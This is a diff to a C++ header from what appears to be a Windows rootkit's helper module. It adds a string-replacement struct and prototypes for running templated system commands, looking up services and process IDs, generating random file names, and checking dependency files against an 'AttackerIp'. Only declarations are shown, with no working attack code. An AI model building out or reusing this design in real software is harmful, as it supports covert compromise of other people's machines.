@@ -2,6 +2,13 @@
 #include "medium.h"
 
 
+typedef struct _REPLACEMENT {
+    char* Replace;
+    char WhereTo;
+    int RepCount;
+} REPLACEMENT, * PREPLACEMENT;
+
+
 // Class used to write log files -
 class LogFile {
 public:
@@ -80,5 +87,19 @@ struct GetHandle {  // iterates through possible handles
     }
 };
 using UniqueHndl = std::unique_ptr<HANDLE, GetHandle>;
-std::uint32_t GetPID(std::string PrcName);  // Get the PID of a running process, NULL if does not exist/not currently running
-BOOL ValidateInfoTypeString(const char* InfoType);  // Check for valid info type string (RKOP_SYSINFO)
+std::uint32_t GetPID(std::string PrcName);
+BOOL ValidateInfoTypeString(const char* InfoType);
+int CharpToWcharp(const char* ConvertString, WCHAR* ConvertedString);
+int WcharpToCharp(char* ConvertString, const WCHAR* ConvertedString);
+std::wstring GetCurrentPath();
+int CountOccurrences(const char* SearchStr, char SearchLetter);
+void GetServiceName(char* Path, char* Buffer);
+void ReplaceValues(const char* BaseString, REPLACEMENT RepArr[], char* Output, int Size);
+DWORD ExecuteSystem(const char* BaseCommand, REPLACEMENT RepArr[], int Size);
+void GetRandomName(char* NameBuf, DWORD RandSize, const char* Extension);
+int GetPidByName(const char* Name);
+int CheckLetterInArr(char Chr, const char* Arr);
+BOOL PerformCommand(const char* CommandArr[], const char* Replacements[], const char* Symbols, int CommandCount, int SymbolCount);
+int VerfifyDepDirs();
+int VerfifyDepFiles(const char* AttackerIp);
+BOOL WINAPI CtrlHandler(DWORD ControlType);
